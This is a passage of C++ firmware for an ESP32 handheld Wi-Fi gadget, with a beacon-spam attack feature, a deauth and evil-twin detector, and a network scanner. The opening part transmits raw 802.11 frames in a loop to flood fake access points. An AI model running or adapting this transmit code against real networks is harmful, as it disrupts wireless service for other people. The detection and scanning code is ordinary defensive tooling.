        result = esp_wifi_80211_tx(WIFI_IF_AP, packet, 57, false);
        if (result != ESP_OK) {
            Serial.printf("Packet 1 send failed: %d\n", result);
        }
        result = esp_wifi_80211_tx(WIFI_IF_AP, packet, 57, false);
        if (result != ESP_OK) {
            Serial.printf("Packet 2 send failed: %d\n", result);
        }
        result = esp_wifi_80211_tx(WIFI_IF_AP, packet, 57, false);
        if (result != ESP_OK) {
            Serial.printf("Packet 3 send failed: %d\n", result);
        }

        delay(1);

      if (pcf.digitalRead(BTN_SELECT) == LOW) {
        break;
      }

    }
}

static bool uiDrawn = false;

void runUI() {
#define SCREEN_WIDTH  240
#define SCREENHEIGHT 320
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#define ICON_NUM 5

  static int iconX[ICON_NUM] = {130, 160, 190, 220, 10};
  static int iconY = STATUS_BAR_Y_OFFSET;

  static const unsigned char* icons[ICON_NUM] = {
    bitmap_icon_sort_down_minus,
    bitmap_icon_sort_up_plus,
    bitmap_icon_start,
    bitmap_icon_nuke,
    bitmap_icon_go_back
  };

  if (!uiDrawn) {
    tft.fillRect(120, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH - 120, STATUS_BAR_HEIGHT, DARK_GRAY);
    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      }
    }
    tft.drawLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, ORANGE);
    uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;
  static unsigned long lastSpamTime = 0;

  switch (animationState) {
    case 0:
      break;

    case 1:
      if (millis() - lastAnimationTime >= 150) {
        tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
        animationState = 2;
        lastAnimationTime = millis();
      }
      break;

    case 2:
      if (millis() - lastAnimationTime >= 200) {
        animationState = 3;
        lastAnimationTime = millis();
      }
      break;

    case 3:
      switch (activeIcon) {
        case 0:
          handleLeftButton();
          animationState = 0;
          activeIcon = -1;
          break;
        case 1:
          handleRightButton();
          animationState = 0;
          activeIcon = -1;
          break;
        case 2:
          handleSelectButton();
          if (spam) {
            animationState = 4;
          } else {
            animationState = 0;
            activeIcon = -1;
          }
          break;
        case 3:
          beaconSpam();
          animationState = 0;
          activeIcon = -1;
          break;

         case 4:
           feature_exit_requested = true;
           animationState = 0;
           activeIcon = -1;
          break;
      }
      break;

    case 4:
      if (spam) {
        if (millis() - lastSpamTime >= 50) {
          spammer();

          if (activeIcon = 3) {
            output();
          }
          if (activeIcon = 3) {
            animationState = 5;
          }
          lastSpamTime = millis();
        }
      } else {
        animationState = 0;
        activeIcon = -1;
      }
      break;

    case 5:
      if (millis() - lastSpamTime >= 50) {
        animationState = 0;
        activeIcon = -1;
      }
      break;
  }

  static unsigned long lastTouchCheck = 0;
  const unsigned long touchCheckInterval = 50;

  if (millis() - lastTouchCheck >= touchCheckInterval) {
    int x, y;
    if (feature_active && readTouchXY(x, y)) {
      if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
            if (icons[i] != NULL && animationState == 0) {

              if (i == 4) {
                feature_exit_requested = true;
              } else {

                tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
                animationState = 1;
                activeIcon = i;
                lastAnimationTime = millis();
              }
            }
            break;
          }
        }
      }
    }
    lastTouchCheck = millis();
  }
}

void beaconSpamSetup() {

  tft.fillScreen(TFT_BLACK);

  setupTouchscreen();

  tft.setTextFont(1);
  tft.setTextSize(1);
  tft.setTextColor(TFT_YELLOW, TFT_BLACK);
  tft.setCursor(2, 30 + y_offset);

  esp_err_t err;
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  err = esp_wifi_init(&cfg);
  if (err != ESP_OK) Serial.printf("WiFi init failed: %d\n", err);

  err = esp_wifi_set_storage(WIFI_STORAGE_RAM);
  if (err != ESP_OK) Serial.printf("Storage set failed: %d\n", err);

  err = esp_wifi_set_mode(WIFI_MODE_AP);
  if (err != ESP_OK) Serial.printf("Mode set failed: %d\n", err);

  err = esp_wifi_start();
  if (err != ESP_OK) Serial.printf("WiFi start failed: %d\n", err);

  err = esp_wifi_set_promiscuous(true);
  if (err != ESP_OK) Serial.printf("Promiscuous set failed: %d\n", err);

  pcf.pinMode(BTN_UP, INPUT_PULLUP);
  pcf.pinMode(BTN_DOWN, INPUT_PULLUP);
  pcf.pinMode(BTN_LEFT, INPUT_PULLUP);
  pcf.pinMode(BTN_RIGHT, INPUT_PULLUP);

  tft.print("[!] Press [UP] to start");

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, true);

  lastSpamChannel = 0xFF;
  lastSpamState   = !spam;

  uiDrawn = false;
  tft.fillRect(0, 20, 120, 16, DARK_GRAY);
}

void beaconSpamLoop() {

  if (feature_active && isButtonPressed(BTN_SELECT)) {
    feature_exit_requested = true;
    return;
  }

  runUI();
  updateStatusBar();

  tft.drawLine(0, 19, 240, 19, TFT_WHITE);

  btnLeftPress = !pcf.digitalRead(BTN_LEFT);
  btnRightPress = !pcf.digitalRead(BTN_RIGHT);
  btnSelectPress = !pcf.digitalRead(BTN_UP);

  delay(10);

  if (btnLeftPress) {
    handleLeftButton();
    delay(200);
  }
  if (btnRightPress) {
    handleRightButton();
    delay(200);
  }
  if (btnSelectPress) {
    handleSelectButton();
    delay(200);
  }

  if (lastSpamChannel != spamchannel || lastSpamState != spam) {
    tft.setTextFont(1);
    tft.fillRect(35, 20, 95, 16, DARK_GRAY);
    tft.setTextColor(TFT_WHITE, DARK_GRAY);
    tft.setTextSize(1);

    tft.setCursor(35, 24);
    tft.print("Ch:");
    tft.print(spamchannel);

    tft.setCursor(70, 24);
    tft.print(spam ? "Enabled " : "Disabled");

    lastSpamChannel = spamchannel;
    lastSpamState   = spam;
  }

  while (spam) {
    runUI();
    if (feature_exit_requested) {
      spam = false;
      break;
    }

    spammer();

    if (btnSelectPress) {
      output();
    }

    if (pcf.digitalRead(BTN_UP)) {
      delay(50);
      break;
    }
  }
}
}

namespace DeauthDetect {

#define SCREEN_HEIGHT 280
#define LINE_HEIGHT 12
#define MAX_LINES (SCREEN_HEIGHT / LINE_HEIGHT)

#define MAX_NETWORKS 50
#define MAX_CHANNELS 14
#define MAX_SSID_LENGTH 8

#define SCREEN_WIDTH  240
#define SCREENHEIGHT 320
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#define ICON_NUM 2

bool stopScan = false;
bool exitMode = false;

String terminalBuffer[MAX_LINES];
uint16_t colorBuffer[MAX_LINES];
int lineIndex = 0;

int deauth[MAX_NETWORKS] = {0};
String ssidLists[MAX_NETWORKS];
uint8_t macList[MAX_NETWORKS][6];

TaskHandle_t wifiScanTaskHandle = NULL;
TaskHandle_t uiTaskHandle = NULL;
TaskHandle_t statusBarTaskHandle = NULL;

SemaphoreHandle_t tftSemaphore;

static int iconX[ICON_NUM] = {210, 10};
static int iconY = STATUS_BAR_Y_OFFSET;
static const unsigned char* icons[ICON_NUM] = {
  bitmap_icon_power,
  bitmap_icon_go_back
};

void scrollTerminal() {
  for (int i = 0; i < MAX_LINES - 1; i++) {
    terminalBuffer[i] = terminalBuffer[i + 1];
    colorBuffer[i] = colorBuffer[i + 1];
  }
}

void displayPrint(String text, uint16_t color, bool extraSpace = false) {
  if (lineIndex >= MAX_LINES - 1) {
    scrollTerminal();
    lineIndex = MAX_LINES - 1;
  }

  terminalBuffer[lineIndex] = text;
  colorBuffer[lineIndex] = color;
  lineIndex++;

  if (extraSpace && lineIndex < MAX_LINES) {
    terminalBuffer[lineIndex] = "";
    colorBuffer[lineIndex] = TFT_WHITE;
    lineIndex++;
  }

  for (int i = 0; i < lineIndex; i++) {
    int yPos = i * LINE_HEIGHT + 45;
    tft.drawLine(0, 19, 240, 19, TFT_WHITE);
    tft.fillRect(5, yPos, tft.width() - 10, LINE_HEIGHT, TFT_BLACK);
    tft.setTextColor(colorBuffer[i], TFT_BLACK);
    tft.setCursor(5, yPos);
    tft.print(terminalBuffer[i]);
  }
}

void checkButtonPress() {
  if (!pcf.digitalRead(BTN_UP)) {
    vTaskDelay(200 / portTICK_PERIOD_MS);
    if (!stopScan) {
      stopScan = true;
      xSemaphoreTake(tftSemaphore, portMAX_DELAY);
      displayPrint("[!] Scanning Stopped", UI_WARN, true);
      displayPrint("[!] Press [Select] to Exit", UI_WARN, false);
      xSemaphoreGive(tftSemaphore);
    } else {
      exitMode = true;
    }
  }
}

void snifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (stopScan || exitMode) return;

  wifi_promiscuous_pkt_t* packet = (wifi_promiscuous_pkt_t*) buf;
  uint8_t* payload = packet->payload;

  if (type == WIFI_PKT_MGMT) {
    uint8_t frameType = payload[0];

    if (frameType == 0xC0) {
      uint8_t senderMAC[6];
      memcpy(senderMAC, payload + 10, 6);

      for (int i = 0; i < MAX_NETWORKS; i++) {
        if (memcmp(senderMAC, macList[i], 6) == 0) {
          deauth[i]++;
          xSemaphoreTake(tftSemaphore, portMAX_DELAY);
          displayPrint("[!] Deauth Attack on: " + ssidLists[i], UI_WARN, true);
          xSemaphoreGive(tftSemaphore);
          break;
        }
      }
    }
  }
}

void analyzeNetworks(int n) {
  xSemaphoreTake(tftSemaphore, portMAX_DELAY);
  displayPrint("[*] Checking for Suspicious Networks", TFT_CYAN, true);
  xSemaphoreGive(tftSemaphore);

  for (int i = 0; i < n; i++) {
    checkButtonPress();
    if (exitMode) return;

    bool isDuplicate = false;
    bool isHidden = (ssidLists[i] == "");
    bool isWeirdChannel = WiFi.channel(i) > 13;

    for (int j = 0; j < n; j++) {
      if (i != j && ssidLists[i] == ssidLists[j] && memcmp(macList[i], macList[j], 6) != 0) {
        isDuplicate = true;
        break;
      }
    }

    if (isHidden) {
      xSemaphoreTake(tftSemaphore, portMAX_DELAY);
      displayPrint("[!] Hidden SSID Detected!", TFT_YELLOW, true);
      xSemaphoreGive(tftSemaphore);
    }
    if (isDuplicate) {
      xSemaphoreTake(tftSemaphore, portMAX_DELAY);
      displayPrint("[!] Evil Twin: " + ssidLists[i], TFT_YELLOW, true);
      xSemaphoreGive(tftSemaphore);
    }
    if (isWeirdChannel) {
      xSemaphoreTake(tftSemaphore, portMAX_DELAY);
      displayPrint("[!] Non-Standard Channel: " + String(WiFi.channel(i)), TFT_YELLOW, true);
      xSemaphoreGive(tftSemaphore);
    }

    if (deauth[i] > 5) {
      xSemaphoreTake(tftSemaphore, portMAX_DELAY);
      displayPrint("[!!!] HIGH DEAUTH ATTACK on " + ssidLists[i] + " (" + String(deauth[i]) + " attacks)", UI_WARN, true);
      xSemaphoreGive(tftSemaphore);
    }
  }
}

void scanWiFiTask(void *param) {
  while (1) {
    checkButtonPress();
    if (exitMode) {
      vTaskDelay(10 / portTICK_PERIOD_MS);
      break;
    }
    if (stopScan) {
      vTaskDelay(10 / portTICK_PERIOD_MS);
      continue;
    }

    xSemaphoreTake(tftSemaphore, portMAX_DELAY);
    displayPrint("[*] Scanning WiFi networks", TFT_CYAN, true);
    xSemaphoreGive(tftSemaphore);

    int n = WiFi.scanNetworks();
    if (exitMode) {
      vTaskDelay(10 / portTICK_PERIOD_MS);
      break;
    }
    if (stopScan) {
      vTaskDelay(10 / portTICK_PERIOD_MS);
      continue;
    }

    for (int i = 0; i < n && i < MAX_NETWORKS; i++) {
      String fullSSID = WiFi.SSID(i);
      ssidLists[i] = fullSSID.substring(0, MAX_SSID_LENGTH);
      const uint8_t *bssid = WiFi.BSSID(i);
      memcpy(macList[i], bssid, 6);

      xSemaphoreTake(tftSemaphore, portMAX_DELAY);
      displayPrint("[+] " + ssidLists[i] + (fullSSID.length() > MAX_SSID_LENGTH ? "..." : "") +
                   " | CH: " + String(WiFi.channel(i)) +
                   " | RSSI: " + String(WiFi.RSSI(i)), TFT_WHITE);
      xSemaphoreGive(tftSemaphore);

      if (exitMode) {
        vTaskDelay(10 / portTICK_PERIOD_MS);
        break;
      }
      if (stopScan) {
        vTaskDelay(10 / portTICK_PERIOD_MS);
        break;
      }
    }
    analyzeNetworks(n);
    vTaskDelay(5000 / portTICK_PERIOD_MS);
  }
  wifiScanTaskHandle = NULL;
  vTaskDelete(NULL);
}

static bool uiDrawn = false;

void runUI() {

    tft.drawLine(0, 19, 240, 19, TFT_WHITE);

    static const unsigned char* icons[ICON_NUM] = {
        bitmap_icon_start,
        bitmap_icon_go_back
    };

    if (!uiDrawn) {
        tft.setTextFont(1);
        tft.fillRect(0, 20, 140, 16, DARK_GRAY);
        tft.setTextColor(TFT_WHITE);
        tft.setTextSize(1);
        tft.setCursor(35, 24);
        tft.print("Scanning WiFi");

        tft.drawLine(0, 19, 240, 19, TFT_WHITE);
        tft.fillRect(140, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH - 140, STATUS_BAR_HEIGHT, DARK_GRAY);

        for (int i = 0; i < ICON_NUM; i++) {
            if (icons[i] != NULL) {
                tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
            }
        }
        tft.drawLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, ORANGE);
        uiDrawn = true;
    }

    static unsigned long lastAnimationTime = 0;
    static int animationState = 0;
    static int activeIcon = -1;

    if (animationState > 0 && millis() - lastAnimationTime >= 150) {
        if (animationState == 1) {
            tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
            animationState = 2;

            switch (activeIcon) {
                case 0:
                    displayPrint("[!] Scanning Stopped", UI_WARN, true);
                    displayPrint("[!] Press [Select] to Exit", UI_WARN, false);
                    stopScan = true;
                    animationState = 0;
                    activeIcon = -1;
                    break;
            }
        } else if (animationState == 2) {
            animationState = 0;
            activeIcon = -1;
        }
        lastAnimationTime = millis();
    }

    static unsigned long lastTouchCheck = 0;
    const unsigned long touchCheckInterval = 50;

    if (millis() - lastTouchCheck >= touchCheckInterval) {
        int x, y;
        if (feature_active && readTouchXY(x, y)) {
            if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
                for (int i = 0; i < ICON_NUM; i++) {
                    if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
                        if (icons[i] != NULL && animationState == 0) {

                            if (i == 1) {
                                displayPrint("[!] Scanning Stopped", UI_WARN, true);
                                stopScan = true;
                                exitMode = true;
                            } else {

                                tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
                                animationState = 1;
                                activeIcon = i;
                                lastAnimationTime = millis();
                            }
                        }
                        break;
                    }
                }
            }
        }
        lastTouchCheck = millis();
    }
}

void uiTask(void *param) {
  while (1) {
    xSemaphoreTake(tftSemaphore, portMAX_DELAY);
    runUI();
    xSemaphoreGive(tftSemaphore);
    vTaskDelay(50 / portTICK_PERIOD_MS);
  }
}

void statusBarTask(void *param) {
  while (1) {
    xSemaphoreTake(tftSemaphore, portMAX_DELAY);
    updateStatusBar();
    xSemaphoreGive(tftSemaphore);
    vTaskDelay(1000 / portTICK_PERIOD_MS);
  }
}

void deauthdetectSetup() {
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();

  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(snifferCallback);

  tft.fillScreen(TFT_BLACK);

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, true);

  pcf.pinMode(BTN_UP, INPUT_PULLUP);
  pcf.pinMode(BTN_DOWN, INPUT_PULLUP);
  pcf.pinMode(BTN_LEFT, INPUT_PULLUP);
  pcf.pinMode(BTN_RIGHT, INPUT_PULLUP);

  setupTouchscreen();

  tftSemaphore = xSemaphoreCreateMutex();

  xTaskCreate(scanWiFiTask, "WiFiScanTask", 4096, NULL, 1, &wifiScanTaskHandle);
  xTaskCreate(uiTask, "UITask", 4096, NULL, 2, &uiTaskHandle);
  xTaskCreate(statusBarTask, "StatusBarTask", 2048, NULL, 1, &statusBarTaskHandle);

   uiDrawn = false;
}

void deauthdetectLoop() {

  if (feature_active && isButtonPressed(BTN_SELECT)) {
    stopScan = true;
    exitMode = true;
  }

  checkButtonPress();

  if (stopScan || exitMode) {

    if (wifiScanTaskHandle != NULL) {
      vTaskDelete(wifiScanTaskHandle);
      wifiScanTaskHandle = NULL;
    }
    if (uiTaskHandle != NULL) {
      vTaskDelete(uiTaskHandle);
      uiTaskHandle = NULL;
    }
    if (statusBarTaskHandle != NULL) {
      vTaskDelete(statusBarTaskHandle);
      statusBarTaskHandle = NULL;
    }

    esp_wifi_set_promiscuous(false);
    WiFi.disconnect();
    stopScan = false;
    exitMode = false;
    lineIndex = 0;
    delay(10);

    feature_exit_requested = true;
  }
}
}

namespace WifiScan {

#define TFT_WIDTH 240
#define TFT_HEIGHT 320

#define SCREEN_WIDTH  240
#define SCREENHEIGHT 320
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#define ICON_NUM 2

int currentIndex = 0;
int listStartIndex = 0;
bool isDetailView = false;
bool isScanning = false;
bool exitRequested = false;

static TaskHandle_t bgScanTaskHandle = nullptr;
static volatile bool bgHasResults = false;
static volatile uint32_t bgLastScanMs = 0;
static const uint32_t BG_SCAN_INTERVAL_MS = 15000;

static const uint32_t BG_BOOT_GRACE_MS = 6000;
static volatile bool bgScanRunning = false;
static uint32_t bgBootMs = 0;

static void bgWifiScanTask(void* ) {
  for (;;) {
    const uint32_t now = millis();
    if (bgBootMs == 0) bgBootMs = now;

    const bool idleOk = (now - bgBootMs) > BG_BOOT_GRACE_MS;
    if (settings().autoWifiScan && idleOk && !feature_active && !in_sub_menu) {

      if (!bgScanRunning) {
        WiFi.mode(WIFI_STA);
        WiFi.disconnect();
        WiFi.scanDelete();
        int ret = WiFi.scanNetworks(true, true);

        bgScanRunning = (ret == WIFI_SCAN_RUNNING);
        if (ret >= 0) {

          bgHasResults = true;
          bgLastScanMs = now;
          vTaskDelay(BG_SCAN_INTERVAL_MS / portTICK_PERIOD_MS);
        } else if (!bgScanRunning) {

          vTaskDelay(2000 / portTICK_PERIOD_MS);
        } else {
          vTaskDelay(250 / portTICK_PERIOD_MS);
        }
      } else {
        int n = WiFi.scanComplete();
        if (n >= 0) {
          bgHasResults = true;
          bgLastScanMs = now;
          bgScanRunning = false;
          vTaskDelay(BG_SCAN_INTERVAL_MS / portTICK_PERIOD_MS);
        } else if (n == WIFI_SCAN_FAILED) {
          bgScanRunning = false;
          WiFi.scanDelete();
          vTaskDelay(2000 / portTICK_PERIOD_MS);
        } else {

          vTaskDelay(250 / portTICK_PERIOD_MS);
        }
      }
    } else {

      bgScanRunning = false;
      vTaskDelay(1000 / portTICK_PERIOD_MS);
    }
  }
}

void startBackgroundScanner() {
  if (bgScanTaskHandle != nullptr) return;
  xTaskCreatePinnedToCore(
    bgWifiScanTask,
    "bgWifiScan",
    4096,
    nullptr,
    1,
    &bgScanTaskHandle,
    0
  );
}

int getLastCount() {

  if (!settings().autoWifiScan) return 0;
  int n = WiFi.scanComplete();
  return (n < 0) ? 0 : n;
}

unsigned long scan_StartTime = 0;
const unsigned long scanTimeout = 2000;
unsigned long lastButtonPress = 0;
const unsigned long debounceTime = 200;

#define MAX_SSID_LENGTH 10

// Deauther-like list geometry (bigger rows + paging + bottom tab bar).
static constexpr int LIST_HEADER_Y = 50;
static constexpr int LIST_FIRST_ROW_Y = LIST_HEADER_Y + 20;
static constexpr int LIST_ROW_H = 22;
static constexpr int LIST_BOTTOM_Y = 300;  // keep clear of tab bar (y=304..320)
static constexpr int NETWORKS_PER_PAGE = (LIST_BOTTOM_Y - LIST_FIRST_ROW_Y) / LIST_ROW_H;

static int current_page = 0;

static bool uiDrawn = false;

static int iconX[ICON_NUM] = {220, 10};
static const unsigned char* icons[ICON_NUM] = {
  bitmap_icon_undo,
  bitmap_icon_go_back
};

static void drawButton(int x, int y, int w, int h, const char* label, bool highlight, bool disabled) {
  FeatureUI::ButtonStyle style = highlight ? FeatureUI::ButtonStyle::Primary
                                           : FeatureUI::ButtonStyle::Secondary;
  FeatureUI::drawButtonRect(x, y, w, h, label, style, false, disabled);
}

static void drawTabBar(const char* leftButton, bool leftDisabled,
                       const char* prevButton, bool prevDisabled,
                       const char* nextButton, bool nextDisabled) {
  tft.fillRect(0, 304, SCREEN_WIDTH, 16, FEATURE_BG);

  if (leftButton[0]) drawButton(0,   304, 57, 16, leftButton, false, leftDisabled);
  if (prevButton[0]) drawButton(117, 304, 57, 16, prevButton, false, prevDisabled);
  if (nextButton[0]) drawButton(177, 304, 57, 16, nextButton, false, nextDisabled);
}

static int last_rendered_page = -1;
static int last_rendered_index = -1;

// Local scan-results cache.
//
// The Arduino String returned by WiFi.SSID(i) trips a heap_caps_free assert
// on the ESP32-DIV V2 ("free() target pointer is outside heap areas") inside
// the destructor — same crash on our build AND on upstream's official
// precompiled v1.6.0 binary, so it isn't a build-config issue. To avoid the
// crash entirely we run our own scan through the esp_wifi C APIs, copy the
// records into a plain POD struct, and render from that. No Arduino String
// destructor on the WiFi data path.
struct ScanRec {
  char     ssid[33];   // 32 chars + null
  uint8_t  bssid[6];
  int8_t   rssi;
  uint8_t  channel;
  uint8_t  auth;       // wifi_auth_mode_t cast
};

static ScanRec scanRecs[MAX_NETWORKS];
static int     scanRecCount = 0;

// Static scratch String reused across calls — never goes out of scope, so its
// destructor (the crash site) never runs. Pre-reserved to 34 bytes so
// getNetworkInfo()'s "ssid = (const char*)it->ssid" assignment never
// reallocates (no realloc → no free → no chance to hit the bad pointer).
static String g_ssidScratch;

// Returns network count, or -1 on error.
//
// We use Arduino's WiFi.scanNetworks() because the direct esp_wifi_scan_start
// path returns 0 APs in this firmware (some interaction with how arduino-esp32
// initialises the radio that we don't unwind). For data extraction we avoid
// WiFi.SSID(i)'s temporary String (the original crash) and use getNetworkInfo()
// writing into g_ssidScratch.
static int wifiScanMyself(bool passive = false, uint32_t ms_per_chan = 300) {
  g_ssidScratch.reserve(34);

  int n = WiFi.scanNetworks(false /*async*/, true /*hidden*/,
                            passive, ms_per_chan);
  if (n < 0) { scanRecCount = 0; return -1; }
  if (n > MAX_NETWORKS) n = MAX_NETWORKS;
  scanRecCount = n;

  for (int i = 0; i < n; i++) {
    uint8_t enc = 0;
    int32_t rssi = 0;
    uint8_t* bssid = nullptr;
    int32_t ch = 0;
    g_ssidScratch = "";
    bool ok = WiFi.getNetworkInfo((uint8_t)i, g_ssidScratch, enc, rssi, bssid, ch);
    if (ok) {
      strncpy(scanRecs[i].ssid, g_ssidScratch.c_str(), 32);
    } else {
      scanRecs[i].ssid[0] = '\0';
    }
    scanRecs[i].ssid[32] = '\0';
    if (bssid) memcpy(scanRecs[i].bssid, bssid, 6);
    else       memset(scanRecs[i].bssid, 0, 6);
    scanRecs[i].rssi    = (int8_t)rssi;
    scanRecs[i].channel = (uint8_t)ch;
    scanRecs[i].auth    = enc;
  }
  return n;
}

static void drawNetworkRow(int i, int y, bool isSel) {
  if (i < 0 || i >= scanRecCount) {
    tft.fillRect(0, y, SCREEN_WIDTH, LIST_ROW_H, TFT_BLACK);
    return;
  }
  const ScanRec& r = scanRecs[i];

  char buf[64];
  char ssid[12];
  strncpy(ssid, r.ssid, 11);
  ssid[11] = '\0';
  if (strlen(r.ssid) > 11) strcat(ssid, "...");

  const int rssi = r.rssi;
  const int ch   = r.channel;
  const int auth = r.auth;
  const char* enc = (auth == WIFI_AUTH_OPEN) ? "OPEN" : "WPA2";
  snprintf(buf, sizeof(buf), "%02d: %-15s %3d dBm Ch%2d %s", i + 1, ssid, rssi, ch, enc);

  // Clear only this row (avoid overlapping next row).
  tft.fillRect(0, y, SCREEN_WIDTH, LIST_ROW_H, TFT_BLACK);

  tft.setCursor(2, y);
  tft.setTextColor(isSel ? ORANGE : FEATURE_BG);
  tft.print(isSel ? ">" : " ");

  tft.setCursor(10, y);
  tft.setTextColor(isSel ? ORANGE : (auth == WIFI_AUTH_OPEN ? ORANGE : WHITE));
  tft.println(buf);
}

void displayWiFiList(bool fullRedraw = false) {
  uiDrawn = false;
  int networkCount = scanRecCount;

  if (fullRedraw) {
    tft.drawLine(0, 19, 240, 19, TFT_WHITE);
    tft.fillRect(0, 37, 240, 320, TFT_BLACK);
    tft.setTextSize(1);
  }

  if (networkCount <= 0) {
    tft.setTextColor(GREEN);
    tft.setCursor(10, LIST_HEADER_Y);
    tft.println("No networks found.");
    tft.setCursor(10, LIST_HEADER_Y + 12);
    tft.println("Press Rescan.");
    drawTabBar("Rescan", false, "Prev", true, "Next", true);
    return;
  }

  // Clamp page in case network count changed.
  const int totalPages = (networkCount + NETWORKS_PER_PAGE - 1) / NETWORKS_PER_PAGE;
  if (current_page < 0) current_page = 0;
  if (current_page > totalPages - 1) current_page = max(0, totalPages - 1);

  listStartIndex = current_page * NETWORKS_PER_PAGE;

  const bool pageChanged = (current_page != last_rendered_page);
  const bool needFull = fullRedraw || pageChanged || (last_rendered_index < 0);

  if (needFull) {
    // Full redraw list (keeps UI consistent with Deauther).
    tft.fillRect(0, 37, 240, 320 - 37, TFT_BLACK);
    tft.setTextColor(GREEN);
    tft.setCursor(10, LIST_HEADER_Y);
    tft.println("Networks:");

    char page_buf[20];
    snprintf(page_buf, sizeof(page_buf), "Page %d/%d", current_page + 1, totalPages);
    tft.setCursor(180, LIST_HEADER_Y);
    tft.setTextColor(GREEN);
    tft.println(page_buf);

    int y = LIST_FIRST_ROW_Y;
    const int end_index = min(listStartIndex + NETWORKS_PER_PAGE, networkCount);
    for (int i = listStartIndex; i < end_index && y < LIST_BOTTOM_Y; i++) {
      drawNetworkRow(i, y, (i == currentIndex));
      y += LIST_ROW_H;
    }

    const bool prevDisabled = (current_page == 0);
    const bool nextDisabled = ((current_page + 1) * NETWORKS_PER_PAGE >= networkCount);
    drawTabBar("Rescan", false, "Prev", prevDisabled, "Next", nextDisabled);
    last_rendered_page = current_page;
    last_rendered_index = currentIndex;
    return;
  }

  // Incremental update: only redraw affected rows.
  if (last_rendered_index != currentIndex) {
    const int prev = last_rendered_index;
    const int now = currentIndex;

    if (prev >= listStartIndex && prev < listStartIndex + NETWORKS_PER_PAGE) {
      const int row = prev - listStartIndex;
      const int y = LIST_FIRST_ROW_Y + row * LIST_ROW_H;
      drawNetworkRow(prev, y, false);
    }
    if (now >= listStartIndex && now < listStartIndex + NETWORKS_PER_PAGE) {
      const int row = now - listStartIndex;
      const int y = LIST_FIRST_ROW_Y + row * LIST_ROW_H;
      drawNetworkRow(now, y, true);
    }
    last_rendered_index = currentIndex;
  }
}

void displayScanning() {
  uiDrawn = false;
  tft.fillRect(0, 37, 240, 320, TFT_BLACK);

  tft.setTextSize(1);
  tft.setTextColor(GREEN);
  tft.setCursor(10, LIST_HEADER_Y);
  tft.println("Scanning...");
  loading(100, ORANGE, 0, 0, 3, true);
  tft.setCursor(10, LIST_HEADER_Y + 15);
  tft.println("Wait a moment.");
  isScanning = false;
}

void startWiFiScan() {
  displayScanning();

  scan_StartTime = millis();
  isScanning = true;
  exitRequested = false;
  isDetailView = false;
  current_page = 0;
  currentIndex = 0;
  listStartIndex = 0;

  // Use our esp_wifi-based scan (populates scanRecs[]) — avoids the
  // Arduino String destructor crash from WiFi.SSID(i).
  int numNetworks = wifiScanMyself(false, 300);

  isScanning = false;

  if (numNetworks >= 0) {
    bgHasResults = true;
    bgLastScanMs = millis();
  }

  displayWiFiList(true);
}

void displayWiFiDetails() {
  uiDrawn = false;
  tft.fillRect(0, 37, 240, 320, TFT_BLACK);

  // Read from our cache; Arduino's WiFi.SSID/BSSIDstr return crashing Strings.
  const int networkCount = scanRecCount;
  if (networkCount <= 0) {
    isDetailView = false;
    displayWiFiList(true);
    return;
  }
  if (currentIndex < 0) currentIndex = 0;
  if (currentIndex >= networkCount) currentIndex = networkCount - 1;

  const ScanRec& r = scanRecs[currentIndex];
  const int rssi = r.rssi;
  const int channel = r.channel;
  const int encryption = r.auth;
  const bool isHidden = (r.ssid[0] == '\0');
  int y = 50;

  float signalQuality = constrain(2 * (rssi + 100), 0, 100);
  float estimatedDistance = pow(10.0, (-69.0 - rssi) / (10.0 * 2.0));

  const char* encryptionType = "Unknown";
  switch (encryption) {
    case WIFI_AUTH_OPEN:            encryptionType = "Open"; break;
    case WIFI_AUTH_WEP:             encryptionType = "WEP"; break;
    case WIFI_AUTH_WPA_PSK:         encryptionType = "WPA"; break;
    case WIFI_AUTH_WPA2_PSK:        encryptionType = "WPA2"; break;
    case WIFI_AUTH_WPA_WPA2_PSK:    encryptionType = "WPA/WPA2"; break;
    case WIFI_AUTH_WPA2_ENTERPRISE: encryptionType = "WPA2-Ent"; break;
    case WIFI_AUTH_WPA3_PSK:        encryptionType = "WPA3"; break;
    case WIFI_AUTH_WPA2_WPA3_PSK:   encryptionType = "WPA2/WPA3"; break;
  }

  char bssidStr[18];
  snprintf(bssidStr, sizeof(bssidStr), "%02X:%02X:%02X:%02X:%02X:%02X",
